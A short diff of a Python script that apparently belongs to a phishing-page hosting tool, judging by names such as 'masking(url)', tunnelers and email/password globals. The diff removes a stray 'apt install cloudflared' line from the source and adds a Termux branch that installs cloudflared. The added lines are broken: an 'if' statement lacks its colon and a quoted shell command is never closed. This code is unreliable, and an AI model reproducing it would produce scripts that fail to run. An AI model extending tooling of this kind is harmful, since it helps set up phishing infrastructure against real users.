@@ -1086,7 +1086,6 @@ def masking(url):
 
 
 # Installing packages and downloading tunnelers
-apt install cloudflared -y
 def requirements():
     global termux, cf_command, lx_command, is_mail_ok, email, password, receiver
     # Termux may not have permission to write in saved_file.
@@ -1114,6 +1113,9 @@ def requirements():
 
     internet()
     if termux:
+        if not is_installed("cloudflared")
+            sprint(f"\n{info}Installing cloudflared{nc}")
+            shell("pkg install cloudflared -y)
         if not is_installed("proot"):
             sprint(f"\n{info}Installing proot{nc}")
             shell("pkg install proot -y")
